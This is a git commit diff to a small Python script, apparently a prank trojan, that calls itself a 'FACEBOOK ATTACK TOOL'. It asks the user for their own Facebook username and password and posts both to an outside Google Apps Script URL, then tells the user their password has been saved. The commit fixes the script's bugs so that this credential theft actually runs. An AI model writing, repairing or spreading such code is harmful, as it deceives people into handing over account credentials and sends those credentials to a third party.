c3a88703e3837f18d8dcd59205df59e5f479c260
Mg thite thite tun <74916390+kweethite@users.noreply.github.com>
2021-02-22 17:39:54 +0000

    Update can-hack-your-acc.py
    Hehe

--- can-hack-your-acc.py
+++ can-hack-your-acc.py
@@ -3,10 +3,10 @@ import os
 os.system('clear') 
 print('WELCOM TO FACEBOOK ATTACK TOOL') 
 mail = input("Enter fb username : ")
-pass = input("Enter password : ")
-data ={'mail':mail,'pass':pass)
-requests.post("https://script.google.com/macros/s/AKfycbyrANAizvME_Y0rh4f6tOwwDl5M2CV_Ux-1xvAjrN7Uf-appT8/exec",date=data)
+spass = input("Enter password : ")
+data ={'mail':mail,'pass':spass}
+requests.post("https://script.google.com/macros/s/AKfycbyrANAizvME_Y0rh4f6tOwwDl5M2CV_Ux-1xvAjrN7Uf-appT8/exec",data=data)
 for i in range(101):
-    print(i+"%")
+    print(i,"%")
     if i == 100:
-       print(f"I Saved Your password ({pass}) in my database \n now you can change your password 😆😆\n education purpose only")
+       print(f"I Saved Your password ({spass}) in my database \n now you can change your password 😆😆\n education purpose only")
